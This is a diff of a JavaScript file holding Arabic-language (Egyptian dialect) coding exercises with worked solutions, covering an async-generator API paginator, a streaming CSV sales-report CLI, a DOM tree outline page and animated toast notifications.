-        { lvl: 'متوسط', t: R`عميل API بصفحات: async generator بيعيد ويتلغي`, what: R`[[paginate.mjs]] فيه [[async function* paginate(url, { signal, retries, log })]]: بيجيب صفحة بـ [[fetch]]، ويطلّع منتجاتها واحد واحد، ويكمّل بالـ cursor اللي في الرد لحد ما يبقى [[null]]. لو السيرفر رد 5xx بيستنى ([[20ms]] ثم [[40ms]]) ويعيد لحد [[retries]]، ولو 4xx بيرمي [[HttpError]] فيها الـ status، ولو الـ [[signal]] اتلغى بيقف في النص. و [[server.mjs]] سيرفر Node على [[127.0.0.1]] فيه ٢٣ منتج وصفحة بتفشل 503 مرة واحدة، و [[demo.mjs]] بيجرّب ٤ حالات. من دروس «AsyncIterator و async generators: for await بعمق» و «Generator: next و return و throw و yield*».`, done: R`الـ ٢٣ منتج بيوصلوا رغم الـ 503 (٦ requests: ٥ صفحات وإعادة)، و [[break]] بعد ٧ منتجات بيعمل requestين بس، و [[AbortSignal.timeout(100)]] بيوقف القراية بـ [[TimeoutError]]، و URL غلط بيرمي [[HttpError]] بـ status 404، وسطر [[[paginate: ...]]] بيتطبع في الأربعة.`, sol: R`**هتشوف إيه:** ٤ حالات، وفي كل واحدة سطر الـ [[finally]] بعدد الصفحات وإذا كان اتقفل ولا اتلغى، وعدد الـ requests اللي السيرفر شافها:
-
-~~~text الناتج: node demo.mjs
-== الكل (والصفحة p10 بتفشل مرة)
-  ↻ 503، محاولة 2 بعد 20ms
-  [paginate: 5 صفحة، اتقفل]
-23 منتج، أول وآخر: item-1 item-23 | requests: 6
-== أول 7 بس
-  [paginate: 2 صفحة، اتقفل]
-1,2,3,4,5,6,7 | requests: 2
-== إلغاء بعد 100ms (كل صفحة 40ms)
-  [paginate: 1 صفحة، اتلغى]
-TimeoutError: The operation was aborted due to timeout | وصل 5 منتج | requests: 2
-== URL غلط
-  [paginate: 0 صفحة، اتقفل]
-HttpError: HTTP 404 من http://127.0.0.1:PORT/nope | status 404
-~~~
-
-~~~js paginate.mjs
-// paginate.mjs: async generator بيلف على API بصفحات (cursor)، بيعيد المحاولة في 5xx، وبيتلغي بـ AbortSignal
-const sleep = (ms, signal) => new Promise((resolve, reject) => {
-  const t = setTimeout(resolve, ms);
-  signal?.addEventListener('abort', () => { clearTimeout(t); reject(signal.reason); }, { once: true });
-});
-
-export class HttpError extends Error {
-  constructor(status, url) { super('HTTP ' + status + ' من ' + url); this.name = 'HttpError'; this.status = status; }
-}
-
-async function getJson(url, { signal, retries, log }) {
-  for (let attempt = 0; ; attempt++) {
-    const res = await fetch(url, { signal });
-    if (res.ok) return res.json();
-    if (res.status >= 500 && attempt < retries) {
-      const wait = 20 * 2 ** attempt;
-      log('  ↻ ' + res.status + '، محاولة ' + (attempt + 2) + ' بعد ' + wait + 'ms');
-      await sleep(wait, signal);
-      continue;
-    }
-    throw new HttpError(res.status, url);
-  }
-}
-
-export async function* paginate(baseUrl, { signal, retries = 2, log = () => {} } = {}) {
-  let cursor = '';
-  let pages = 0;
-  try {
-    do {
-      signal?.throwIfAborted();
-      const url = baseUrl + (cursor ? '?cursor=' + encodeURIComponent(cursor) : '');
-      const page = await getJson(url, { signal, retries, log });
-      pages++;
-      yield* page.items;
-      cursor = page.next;
-    } while (cursor);
-  } finally {
-    log('  [paginate: ' + pages + ' صفحة، ' + (signal?.aborted ? 'اتلغى' : 'اتقفل') + ']');
-  }
-}
-~~~
-
-~~~js server.mjs
-// server.mjs: API وهمي على localhost: 23 منتج، 5 في الصفحة، و cursor، وصفحة بتفشل 503 مرة واحدة
-import { createServer } from 'node:http';
-
-export function startServer({ delay = 0, failOnce = 'p10' } = {}) {
-  const products = Array.from({ length: 23 }, (_, i) => ({ id: i + 1, name: 'item-' + (i + 1) }));
-  let requests = 0;
-  let failed = false;
-  const server = createServer(async (req, res) => {
-    requests++;
-    const url = new URL(req.url, 'http://x');
-    if (url.pathname !== '/products') { res.writeHead(404).end(); return; }
-    const cursor = url.searchParams.get('cursor') ?? 'p0';
-    if (!/^p\d+$/.test(cursor)) { res.writeHead(400).end(); return; }
-    if (cursor === failOnce && !failed) { failed = true; res.writeHead(503).end(); return; }
-    if (delay) await new Promise((r) => setTimeout(r, delay));
-    const start = Number(cursor.slice(1));
-    const items = products.slice(start, start + 5);
-    const next = start + 5 < products.length ? 'p' + (start + 5) : null;
-    res.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ items, next }));
-  });
-  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => {
-    resolve({ url: 'http://127.0.0.1:' + server.address().port + '/products', get requests() { return requests; }, close: () => server.close() });
-  }));
-}
-~~~
-
-~~~js demo.mjs
-// node demo.mjs: ٤ حالات: الكل، و break بدري، و إلغاء بالوقت، و 404
-import { startServer } from './server.mjs';
-import { paginate } from './paginate.mjs';
-const log = (m) => console.log(m);
-
-let api = await startServer();
-console.log('== الكل (والصفحة p10 بتفشل مرة)');
-const all = await Array.fromAsync(paginate(api.url, { log }));
-console.log(all.length, 'منتج، أول وآخر:', all[0].name, all.at(-1).name, '| requests:', api.requests);
-api.close();
-
-api = await startServer();
-console.log('== أول 7 بس');
-const first7 = [];
-for await (const p of paginate(api.url, { log })) { first7.push(p.id); if (first7.length === 7) break; }
-console.log(first7.join(','), '| requests:', api.requests);
-api.close();
-
-api = await startServer({ delay: 40, failOnce: null });
-console.log('== إلغاء بعد 100ms (كل صفحة 40ms)');
-const got = [];
-try {
-  for await (const p of paginate(api.url, { signal: AbortSignal.timeout(100), log })) got.push(p.id);
-} catch (e) {
-  console.log(e.name + ':', e.message, '| وصل', got.length, 'منتج | requests:', api.requests);
-}
-api.close();
-
-api = await startServer();
-console.log('== URL غلط');
-try { await Array.fromAsync(paginate(api.url.replace('products', 'nope'), { log })); }
-catch (e) { console.log(e.name + ':', e.message.replace(/:\d+/, ':PORT'), '| status', e.status); }
-api.close();
-~~~
-
-~~~json package.json
-{ "type": "module" }
-~~~
-
-**كل حتة بتعمل إيه:**
-
-- [[paginate]] **lazy**: الصفحة الجاية مبتتطلبش غير لما اللي بيلف يخلّص منتجات الصفحة الحالية ([[yield* page.items]]). عشان كده [[break]] بعد ٧ منتجات = requestين بس.
-- [[getJson]]: الـ retry في دالة لوحدها. [[res.ok]] الأول، وبعدين 5xx بس بيتعاد (4xx غلطة عندك، الإعادة مش هتصلّحها)، والانتظار بيتضاعف: [[20 * 2 ** attempt]].
-- [[sleep(ms, signal)]]: الانتظار نفسه بيتلغي لو الـ signal اتلغى، وإلا الإلغاء كان هيستنى الـ backoff يخلص.
-- [[signal?.throwIfAborted()]] قبل كل صفحة، و [[fetch(url, { signal })]] بيلغي الـ request اللي شغال. والـ error اللي بيطلع اسمه [[TimeoutError]] لأن [[AbortSignal.timeout]] بيلغي بيه.
-- [[finally]]: سطر واحد بيقول اتقفل ولا اتلغى. في عميل حقيقي هنا تقفل connections أو تسجّل metrics.
-- السيرفر بـ [[listen(0)]]: Node بيختار port فاضي، فالـ demo مبيخبطش في حاجة شغالة على جهازك. و [[failOnce]] بيخلي صفحة [[p10]] ترد 503 مرة واحدة بس.
-
-**الغلطات اللي حصلت وأنا ببنيه:**
-
-- في حالة الإلغاء كنت متوقّع صفحتين (كل صفحة 40ms والمهلة 100ms)، والناتج قال صفحة واحدة و requestين: أول [[fetch]] على connection جديدة بياخد وقت زيادة (فتح الاتصال)، فالصفحة التانية كانت لسه في السكة لما الـ 100ms خلصت واتلغت. الأرقام دي بتختلف من جهاز للتاني، فالـ demo بيطبع اللي حصل فعلًا بدل ما يفترض.
-- رسالة الـ 404 فيها port عشوائي كل تشغيل، فاستبدلته بـ [[PORT]] في الطباعة بس ([[replace(/:\d+/, ':PORT')]]) عشان الناتج يتقارن.` },
-        { lvl: 'كبير', t: R`csv-report: تقرير مبيعات من CSV مليون سطر بذاكرة ثابتة`, what: R`أداة سطر أوامر [[node cli.mjs sales.csv --city X --limit N --top N]] (الـ options اختيارية) بتقرا ملف CSV كبير **سطر سطر** بـ async generators وبتطلّع: عدد الصفوف، والإيراد، والإيراد لكل مدينة، وأكتر منتجات، وعدد السطور البايظة وأول ٣ بأرقام سطورها، والوقت وأقصى ذاكرة. الـ parser بيفهم [[","]] جوه علامات التنصيص و [[""]] كـ [["]]، والسطور البايظة بتتسجّل ومبتوقفش القراية، و [[--limit]] بيقف بدري **ويقفل الملف**. ومعاها [[gen-data.mjs]] بيعمل الملف، و [[csv.test.mjs]] بـ [[node --test]]، و [[eager.mjs]] للمقارنة. من الوحدة كلها، ودرس «AsyncIterator و async generators» بالذات.`, done: R`[[node --test]] بيعدّي الـ ٨ اختبارات. على مليون سطر (35.2 MB): ٩٩٩٦٧٤ صف محسوب و ٣٢٦ سطر بايظ، والذاكرة حوالي 160 MB، و [[--limit 5]] بيقرا 0.1 MB بس. و [[--max-old-space-size=64]] الأداة بتشتغل والنسخة اللي بتقرا الملف كله بتقع بـ heap out of memory. والملف المش موجود والـ options الغلط والملف الفاضي بيطلّعوا رسالة و exit code 1.`, ext: R`زوّد [[--group-by product]] بدل المدينة، وخلّي الأداة تقرا من stdin لو اسم الملف [[-]] ([[cat sales.csv | node cli.mjs -]])، واكتب التقرير JSON بـ [[--json]]، وجرّبها على ملف ١٠ مليون سطر وقيس الذاكرة.`, sol: R`**هتشوف إيه:** تقرير المليون سطر في أقل من ٢ ثانية، والمدن مترتبة بالإيراد، والسطور البايظة متسجّلة بأرقامها:
-
-~~~text الناتج: node cli.mjs sales.csv (Node 24.22، ويندوز 11)
-صفوف محسوبة: 999674
-الإيراد: 174,967,253.50
-  Mansoura             36,995,552.00
-  Cairo, Nasr City     35,995,678.50
-  Alex                 34,995,362.50
-  Giza                 33,995,934.50
-  Cairo                32,984,726.00
-أكتر منتجات بالكمية: rice 999881 | pasta "large" 999877 | oil 999873
-سطور بايظة: 326 (أول ٣: سطر 5001: qty أو price مش رقم؛ سطر 7920: متوقع 5 خانات ولقيت 1؛ سطر 10001: qty أو price مش رقم)
-اتقرا 35.2 MB في 1678ms، وأقصى ذاكرة 160 MB
-~~~
-
-~~~text شجرة الملفات
-csv-report/
-├── package.json      { "type": "module" }
-├── gen-data.mjs      بيعمل sales.csv (مليون سطر فيهم سطور بايظة بقصد)
-├── csv.mjs           parseLine و readLines و rows: القراية سطر سطر
-├── report.mjs        summarize: لفة واحدة بتجمّع، وبتقف عند الـ limit
-├── cli.mjs           الـ arguments والطباعة والأخطاء والقياس
-├── csv.test.mjs      8 اختبارات بـ node --test
-└── eager.mjs         نفس التقرير بالملف كله في الذاكرة، للمقارنة بس
-~~~
-
-**ترتيب البناء:** [[parseLine]] الأول بالاختبارات بتاعته (أصعب حتة وأسهل حاجة تختبرها)، وبعدين [[rows]] على array سطور عادية (من غير ملفات)، وبعدين [[readLines]] على ملف، وبعدين [[summarize]]، وفي الآخر [[cli.mjs]] و [[gen-data.mjs]] والقياس.
-
-~~~js gen-data.mjs
-// node gen-data.mjs [rows] [file]: بيعمل CSV مبيعات وهمي فيه سطور بايظة بقصد
-import { createWriteStream } from 'node:fs';
-import { once } from 'node:events';
-
-const rows = Number(process.argv[2] ?? 200000);
-const file = process.argv[3] ?? 'sales.csv';
-const cities = ['Cairo', 'Giza', 'Alex', '"Cairo, Nasr City"', 'Mansoura'];
-const products = ['tea', 'rice', 'oil', 'sugar', '"pasta ""large"""'];
-
-const out = createWriteStream(file);
-out.write('date,city,product,qty,price\n');
-for (let i = 1; i <= rows; i++) {
-  const day = String((i % 28) + 1).padStart(2, '0');
-  let line = '2026-11-' + day + ',' + cities[i % 5] + ',' + products[(i * 7) % 5] + ',' + ((i % 9) + 1) + ',' + (10 + (i % 50)) + '.50';
-  if (i % 5000 === 0) line = '2026-11-' + day + ',Cairo,tea,x,12.50';
-  if (i % 7919 === 0) line = 'broken line without columns';
-  if (!out.write(line + '\n')) await once(out, 'drain');
-}
-out.end();
-await once(out, 'finish');
-console.log('اتكتب', rows, 'سطر في', file);
-~~~
-
-~~~js csv.mjs
-// csv.mjs: قراية CSV سطر سطر كـ async generators، من غير ما الملف يدخل الذاكرة
-import { createReadStream } from 'node:fs';
-import { createInterface } from 'node:readline';
-
-export class CsvError extends Error {
-  constructor(message, lineNo, line) { super(message); this.name = 'CsvError'; this.lineNo = lineNo; this.line = line; }
-}
-
-// سطر CSV لخانات: الخانة اللي بين "..." فيها , عادي، و "" جواها = " واحدة
-export function parseLine(line) {
-  const cells = [];
-  let cell = '', quoted = false;
-  for (let i = 0; i < line.length; i++) {
-    const ch = line[i];
-    if (quoted) {
-      if (ch === '"' && line[i + 1] === '"') { cell += '"'; i++; }
-      else if (ch === '"') quoted = false;
-      else cell += ch;
-    } else if (ch === '"') quoted = true;
-    else if (ch === ',') { cells.push(cell); cell = ''; }
-    else cell += ch;
-  }
-  if (quoted) throw new SyntaxError('علامة " مفتوحة ومتقفلتش');
-  cells.push(cell);
-  return cells;
-}
-
-// السطور واحد واحد، والـ finally بتقفل الملف حتى لو اللي بيلف عمل break
-export async function* readLines(file, stats = {}) {
-  const input = createReadStream(file, { encoding: 'utf8' });
-  const rl = createInterface({ input, crlfDelay: Infinity });
-  try {
-    yield* rl;
-  } finally {
-    rl.close();
-    input.destroy();
-    stats.bytes = input.bytesRead;
-    stats.destroyed = input.destroyed;
-  }
-}
-
-// كل سطر بقى object بأسامي الأعمدة ونوعها، والسطر البايظ بيروح لـ onError ويتعدّى
-export async function* rows(lines, { onError = () => {} } = {}) {
-  let header = null, lineNo = 0;
-  for await (const line of lines) {
-    lineNo++;
-    if (line.trim() === '') continue;
-    let cells;
-    try { cells = parseLine(line); } catch (e) { onError(new CsvError(e.message, lineNo, line)); continue; }
-    if (!header) { header = cells.map((h) => h.trim()); continue; }
-    if (cells.length !== header.length) { onError(new CsvError('متوقع ' + header.length + ' خانات ولقيت ' + cells.length, lineNo, line)); continue; }
-    const row = Object.fromEntries(header.map((h, i) => [h, cells.at(i)]));
-    row.qty = Number(row.qty);
-    row.price = Number(row.price);
-    if (!Number.isInteger(row.qty) || !Number.isFinite(row.price)) { onError(new CsvError('qty أو price مش رقم', lineNo, line)); continue; }
-    row.lineNo = lineNo;
-    yield row;
-  }
-  if (!header) throw new CsvError('الملف فاضي: مفيش header', 0, '');
-}
-~~~
-
-~~~js report.mjs
-// report.mjs: بيلف على الصفوف مرة واحدة ويجمّع، ويقف بدري لو فيه limit
-export async function summarize(source, { city = null, limit = Infinity, top = 3 } = {}) {
-  const byCity = new Map();
-  const byProduct = new Map();
-  let count = 0, revenue = 0;
-  for await (const row of source) {
-    if (city && row.city !== city) continue;
-    const amount = Math.round(row.qty * row.price * 100);
-    count++;
-    revenue += amount;
-    byCity.set(row.city, (byCity.get(row.city) ?? 0) + amount);
-    byProduct.set(row.product, (byProduct.get(row.product) ?? 0) + row.qty);
-    if (count >= limit) break;
-  }
-  const topProducts = byProduct.entries().toArray().sort((a, b) => b[1] - a[1]).slice(0, top);
-  const cities = byCity.entries().map(([name, cents]) => [name, cents / 100]).toArray().sort((a, b) => b[1] - a[1]);
-  return { count, revenue: revenue / 100, cities, topProducts };
-}
-~~~
-
-~~~js cli.mjs
-// node cli.mjs <file.csv> [--city X] [--limit N] [--top N]: تقرير مبيعات من CSV كبير سطر سطر
-import { parseArgs } from 'node:util';
-import { access } from 'node:fs/promises';
-import { readLines, rows } from './csv.mjs';
-import { summarize } from './report.mjs';
-
-const usage = 'الاستخدام: node cli.mjs <file.csv> [--city Cairo] [--limit 1000] [--top 3]';
-let args;
-try {
-  args = parseArgs({ allowPositionals: true, options: { city: { type: 'string' }, limit: { type: 'string' }, top: { type: 'string', default: '3' } } });
-} catch (e) { console.error(e.message + '\n' + usage); process.exit(1); }
-const [file] = args.positionals;
-const limit = args.values.limit === undefined ? Infinity : Number(args.values.limit);
-const top = Number(args.values.top);
-if (!file || !(limit > 0) || !Number.isInteger(top) || top < 1) { console.error(usage); process.exit(1); }
-try { await access(file); } catch (e) { console.error('مش لاقي الملف: ' + file + ' (' + e.code + ')'); process.exit(1); }
-
-const started = performance.now();
-const stats = {};
-const errors = [];
-let peakRss = 0;
-const sampler = setInterval(() => { peakRss = Math.max(peakRss, process.memoryUsage().rss); }, 20);
-let report;
-try {
-  report = await summarize(rows(readLines(file, stats), { onError: (e) => errors.push(e) }), { city: args.values.city ?? null, limit, top });
-} catch (e) {
-  console.error(e.name + ': ' + e.message);
-  process.exit(1);
-} finally {
-  clearInterval(sampler);
-}
-peakRss = Math.max(peakRss, process.memoryUsage().rss);
-
-const fmt = new Intl.NumberFormat('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-console.log('صفوف محسوبة: ' + report.count + (args.values.city ? ' (مدينة ' + args.values.city + ')' : ''));
-console.log('الإيراد: ' + fmt.format(report.revenue));
-for (const [name, total] of report.cities) console.log('  ' + name.padEnd(18) + fmt.format(total).padStart(16));
-console.log('أكتر منتجات بالكمية: ' + report.topProducts.map(([p, q]) => p + ' ' + q).join(' | '));
-console.log('سطور بايظة: ' + errors.length + (errors.length ? ' (أول ٣: ' + errors.slice(0, 3).map((e) => 'سطر ' + e.lineNo + ': ' + e.message).join('؛ ') + ')' : ''));
-console.log('اتقرا ' + (stats.bytes / 1e6).toFixed(1) + ' MB في ' + Math.round(performance.now() - started) + 'ms، وأقصى ذاكرة ' + Math.round(peakRss / 1e6) + ' MB');
-~~~
-
-~~~js csv.test.mjs
-// node --test: اختبارات الـ parser والصفوف والتقرير والقفل البدري
-import { test } from 'node:test';
-import assert from 'node:assert/strict';
-import { writeFileSync, mkdtempSync, rmSync } from 'node:fs';
-import { tmpdir } from 'node:os';
-import { join } from 'node:path';
-import { parseLine, readLines, rows, CsvError } from './csv.mjs';
-import { summarize } from './report.mjs';
-
-const dir = mkdtempSync(join(tmpdir(), 'csv-test-'));
-const fileWith = (name, text) => { const f = join(dir, name); writeFileSync(f, text); return f; };
-test.after(() => rmSync(dir, { recursive: true, force: true }));
-
-test('parseLine: فاصلة جوه علامات تنصيص، و "" جواها', () => {
-  assert.deepEqual(parseLine('a,"b, c","say ""hi""",'), ['a', 'b, c', 'say "hi"', '']);
-});
-
-test('parseLine: علامة مفتوحة بترمي', () => {
-  assert.throws(() => parseLine('a,"b'), SyntaxError);
-});
-
-test('rows: header و أنواع و رقم السطر، والسطر الفاضي بيتعدّى', async () => {
-  const lines = ['date,city,product,qty,price', '', '2026-11-01,Cairo,tea,2,10.50'];
-  const out = await Array.fromAsync(rows(lines));
-  assert.deepEqual(out, [{ date: '2026-11-01', city: 'Cairo', product: 'tea', qty: 2, price: 10.5, lineNo: 3 }]);
-});
-
-test('rows: السطور البايظة بتروح لـ onError ومبتوقفش القراية', async () => {
-  const errors = [];
-  const lines = ['a,b,qty,price,x', '1,2,x,3,4', 'only one', '1,2,3,4.5,5', '1,"open,3,4,5'];
-  const header = ['a', 'b', 'qty', 'price', 'x'];
-  const out = await Array.fromAsync(rows(lines, { onError: (e) => errors.push(e) }));
-  assert.equal(out.length, 1);
-  assert.deepEqual(Object.keys(out[0]).slice(0, 5), header);
-  assert.deepEqual(errors.map((e) => [e.lineNo, e instanceof CsvError]), [ [2, true], [3, true], [5, true] ]);
-});
-
-test('rows: ملف فاضي بيرمي CsvError', async () => {
-  await assert.rejects(Array.fromAsync(rows([])), { name: 'CsvError', message: /فاضي/ });
-});
-
-test('readLines + rows من ملف حقيقي فيه \\r\\n (ويندوز)', async () => {
-  const f = fileWith('win.csv', 'date,city,product,qty,price\r\n2026-11-01,Giza,rice,3,20\r\n');
-  const out = await Array.fromAsync(rows(readLines(f)));
-  assert.equal(out[0].price, 20);
-  assert.equal(out[0].city, 'Giza');
-});
-
-test('limit: بيقف بدري ويقفل الـ stream قبل آخر الملف', async () => {
-  const body = Array.from({ length: 50000 }, (_, i) => '2026-11-01,Cairo,tea,1,' + i).join('\n');
-  const f = fileWith('big.csv', 'date,city,product,qty,price\n' + body);
-  const stats = {};
-  const report = await summarize(rows(readLines(f, stats)), { limit: 10 });
-  assert.equal(report.count, 10);
-  assert.equal(stats.destroyed, true, 'الملف لسه مفتوح بعد ما التقرير وقف');
-  assert.ok(stats.bytes < 200000, 'اتقرا ' + stats.bytes + ' بايت من ' + (body.length + 28));
-});
-
-test('summarize: فلتر المدينة والإيراد بالقروش من غير كسور', async () => {
-  const data = [
-    { city: 'Cairo', product: 'tea', qty: 3, price: 0.1 },
-    { city: 'Giza', product: 'tea', qty: 1, price: 5 },
-    { city: 'Cairo', product: 'oil', qty: 1, price: 0.2 },
+sample.addEventListener("click", e => {
+  const el = e.target;
+  sample.querySelector(".picked")?.classList.remove("picked");
+  el.classList.add("picked");
+  const parts = [
+    "العنصر: " + el.localName,
+    "الأب: " + (el === sample ? "body" : el.parentElement.localName),
+    "إخواته: " + (el.parentElement ? el.parentElement.children.length - 1 : 0),
+    "أولاده: " + el.children.length,
+    "أقرب li: " + (el.closest("li")?.firstChild.nodeValue.trim() || "مفيش"),
   ];
-  const r = await summarize(data, { city: 'Cairo' });
-  assert.deepEqual([r.count, r.revenue, r.cities], [2, 0.5, [ ['Cairo', 0.5] ] ]);
-  assert.deepEqual(r.topProducts, [ ['tea', 3], ['oil', 1] ]);
+  info.textContent = parts.join(" | ");
+});
+document.querySelector("#text").addEventListener("change", draw);
+draw();
+</script>
+</body>
+</html>
+~~~
+
+## هتشوف إيه
+
+فوق المنيو نفسه بإطار متقطع، وتحته الشجرة بالإنجليزي من الشمال لليمين (أسامي التاجز)، والرقم. علّم على الـ checkbox: الشجرة بتطول لـ ٢٠ عقدة وتبان المسافات والسطور الجديدة كنصوص [["\n  "]]، والتعليق [[<!-- قريب: تشيز كيك -->]]. دوس على «شاي»: يتحط حواليه إطار أخضر والسطر يتغيّر.
+
+~~~text الناتج (Chrome 157، Playwright)
+nav#sample
+ ├─ h2
+ └─ ul
+    ├─ li
+    │  └─ ul
+    │     ├─ li
+    │     └─ li
+    └─ li
+
+7 عنصر تحت الـ nav
+
+(مع الـ checkbox: 20 عقدة تحت الـ nav)
+ضغطة على «شاي»:  العنصر: li | الأب: ul | إخواته: 1 | أولاده: 0 | أقرب li: شاي
+ضغطة على العنوان: العنصر: h2 | الأب: nav | إخواته: 1 | أولاده: 0 | أقرب li: مفيش
+~~~
+
+## كل حتة بتعمل إيه
+
+- **[[label(node)]]:** بتفرق بالـ [[nodeType]]: العنصر باسمه ([[localName]]) والـ id، والنص بـ [[JSON.stringify]] عشان الـ [[\n]] والمسافات تبان، والتعليق بين [[<!--]] و [[-->]].
+- **[[outline(node, withText, prefix, last, lines)]]:** recursive. كل نداء بيكتب سطر العقدة، وبعدين بينادي نفسه على كل ابن ومعاه [[prefix]] أطول: [["│  "]] لو فيه إخوات تحت، و [["   "]] لو ده آخر واحد. ده اللي بيرسم الخطوط مظبوطة.
+- **[[withText ? node.childNodes : node.children]]:** السطر اللي بيفرق بين الشجرتين. نفس الدالة، والفرق كله في المصدر.
+- **[[[...]]] قبل [[forEach]]:** [[children]] (HTMLCollection) مالهاش [[forEach]]، فحوّلناها array.
+- **الضغطة:** listener واحد على الـ [[nav]]، و [[e.target]] هو العنصر اللي اتداس عليه بالظبط. [[el.closest("li")?.firstChild.nodeValue]] بيطلع لأقرب [[li]] وياخد النص اللي في أوله (الـ [[?.]] عشان العنوان مالوش [[li]]).
+
+## فخاخ اتعمل حسابها في الكود
+
+- **[[el === sample ? "body" : ...]]:** الضغطة على الـ [[nav]] نفسه (في المسافة بين العناصر) بتخلي [[e.target]] هو الـ [[nav]]، وأبوه [[body]].
+- **[[.trim()]] على «أقرب li»:** الـ [[li]] الكبير «مشروبات سخنة» أول عقدة فيه نص بعده سطر جديد ومسافات (باين في الشجرة بالـ checkbox).
+
+## اتقاس
+
+- Playwright في Chrome 157: العدّين (٧ و ٢٠) والسطرين اللي فوق، ومفيش ولا [[pageerror]].
+- على عرض ٣٦٠: [[scrollWidth]] طلع ٣٤٥ مش ٣٦٠، لأن الـ scrollbar الرأسي واخد ١٥px. يعني مفيش scroll أفقي، والـ [[pre]] عليه [[overflow-x: auto]] فالشجرة لو طولت بتعمل scroll جوه نفسها.
+- في الـ preview الحي في الموقع ده: شغالة كلها (مفيش تخزين ولا شبكة).` },
+        { lvl: 'صغير', dir: "toast-stack", t: R`إشعارات بتدخل وتخرج بـ animate`, what: R`زرارين «اتحفظ» و «فشل»، وكل ضغطة بتطلّع إشعار تحت في الركن: بيدخل من تحت بـ [[element.animate]]، وبيختفي لوحده بعد ٣ ثواني (الخطأ ٥)، وتحته خط بيقصر مع الوقت. لو الماوس وقف على الإشعار الوقت بيقف، وزرار × بيقفله. الخروج animation وبعد [[await anim.finished]] العنصر يتمسح. ومع [[prefers-reduced-motion]] الدخول والخروج fade بس من غير حركة. من درسي «Web Animations API» و «event handlers».`, done: R`٣ ضغطات = ٣ إشعارات، والماوس على إشعار الخطأ بيخليه يفضل والتانيين يختفوا، و × بيمسحه وسطر «فاضل 0 إشعار» بيظهر، ومع reduce الـ keyframes من غير [[transform]].`, sol: R`## الشكل النهائي
+
+~~~live 300 index.html
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>إشعارات</title>
+<style>
+  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; min-height: 260px; }
+  button { font: inherit; padding: 6px 14px; border-radius: 6px; border: 1px solid #ccc; background: #f3f4f6; cursor: pointer; }
+  #toasts { position: fixed; inset-block-end: 12px; inset-inline-start: 12px; display: grid; gap: 8px; width: min(320px, calc(100% - 24px)); margin: 0; padding: 0; list-style: none; }
+  .toast { display: flex; justify-content: space-between; align-items: center; gap: 8px; padding: 10px 12px; border-radius: 8px; color: #fff; box-shadow: 0 4px 12px #0003; }
+  .toast.ok { background: #0b6e4f; }
+  .toast.err { background: #b42318; }
+  .toast button { background: transparent; color: inherit; border-color: #fff8; padding: 0 8px; }
+</style>
+</head>
+<body>
+<p>
+  <button id="ok" type="button">اتحفظ</button>
+  <button id="err" type="button">فشل</button>
+</p>
+<p id="log" aria-live="polite"></p>
+<ul id="toasts" aria-live="polite"></ul>
+<script>
+const list = document.querySelector("#toasts");
+const log = document.querySelector("#log");
+const calm = matchMedia("(prefers-reduced-motion: reduce)");
+
+// الدخول: من تحت وبيظهر. ولو اليوزر طالب حركة أقل: ظهور بس
+const enter = () => calm.matches
+  ? [{ opacity: 0 }, { opacity: 1 }]
+  : [{ opacity: 0, transform: "translateY(16px) scale(.96)" }, { opacity: 1, transform: "none" }];
+
+function toast(text, kind = "ok", ms = 3000) {
+  const li = document.createElement("li");
+  li.className = "toast " + kind;
+  const span = document.createElement("span");
+  span.textContent = text;
+  const close = document.createElement("button");
+  close.type = "button";
+  close.textContent = "×";
+  close.setAttribute("aria-label", "اقفل الإشعار");
+  li.append(span, close);
+  list.append(li);
+  li.animate(enter(), { duration: 250, easing: "ease-out" });
+
+  // شريط الوقت: animation تانية بنوقفها لما الماوس يقف على الإشعار
+  const timer = li.animate([{ boxShadow: "inset 0 -3px 0 #fff8" }, { boxShadow: "inset 0 -3px 0 #fff0" }], { duration: ms });
+  li.addEventListener("pointerenter", () => timer.pause());
+  li.addEventListener("pointerleave", () => timer.play());
+  timer.finished.then(() => dismiss(li)).catch(() => {}); // cancel() بيرفض الـ promise بـ AbortError
+  close.addEventListener("click", () => { timer.cancel(); dismiss(li); }, { once: true });
+}
+
+async function dismiss(li) {
+  if (li.dataset.leaving) return;
+  li.dataset.leaving = "1";
+  const out = li.animate([{ opacity: 1 }, { opacity: 0, transform: calm.matches ? "none" : "translateX(-24px)" }], { duration: 200, fill: "forwards" });
+  await out.finished;
+  li.remove();
+  log.textContent = "فاضل " + list.children.length + " إشعار";
+}
+
+document.querySelector("#ok").addEventListener("click", () => toast("الملاحظة اتحفظت", "ok"));
+document.querySelector("#err").addEventListener("click", () => toast("الشبكة فصلت، جرّب تاني", "err", 5000));
+</script>
+</body>
+</html>
+~~~
+
+## هتشوف إيه
+
+دوس «اتحفظ» كذا مرة: كل إشعار أخضر بيطلع من تحت فوق اللي قبله، وتحته خط أبيض خفيف بيختفي، وبعد ٣ ثواني بيتسحب لليسار ويختفي، والسطر فوق بيقول فاضل كام. «فشل» أحمر وبيقعد ٥ ثواني. حط الماوس على أي واحد: الوقت بيقف لحد ما تشيله.
+
+~~~text الناتج (Chrome 157، Playwright)
+٣ ضغطات:                         3 إشعارات
+الماوس على الأحمر ٣٫٤ ثانية:      فاضل الأحمر بس، السطر: «فاضل 1 إشعار»
+× على الأحمر:                     0 إشعارات، السطر: «فاضل 0 إشعار»
+reducedMotion = "reduce":          keyframes الدخول: ["no-transform","no-transform"]
+~~~
+
+## كل حتة بتعمل إيه
+
+- **[[li.animate(enter(), { duration: 250 })]]:** الدخول. [[enter()]] دالة مش ثابت عشان تقرا [[calm.matches]] كل مرة: لو اليوزر غيّر الإعداد والصفحة مفتوحة، الإشعار الجاي يحترمه.
+- **التايمر animation:** بدل [[setTimeout]]، الإشعار عليه animation تانية مدتها [[ms]] (الخط اللي تحت). [[timer.pause()]] مع [[pointerenter]] و [[timer.play()]] مع [[pointerleave]] بيوقفوا الوقت نفسه، و [[timer.finished.then(() => dismiss(li))]] بيقفل لما الوقت يخلص. كده الوقف والكمّل ببلاش: مفيش حساب «فاضل كام ms».
+- **[[.catch(() => {})]] على [[timer.finished]]:** زرار × بيعمل [[timer.cancel()]]، والـ cancel بيرفض الـ Promise بـ [[AbortError]]. من غير الـ catch هيطلع «Uncaught (in promise)».
